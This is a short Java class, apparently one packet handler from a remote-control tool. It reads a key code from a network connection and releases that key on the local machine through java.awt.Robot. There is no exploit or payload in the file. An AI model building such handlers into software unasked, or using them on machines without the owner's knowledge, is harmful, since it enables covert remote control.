package com.redpois0n.packets;

import com.redpois0n.Connection;
import com.redpois0n.Main;

public class PacketKR extends Packet {

	@Override
	public void read(String line) throws Exception {
		int btn = Integer.parseInt(Connection.readLine());
		Main.robot.keyRelease(btn);
	}

}
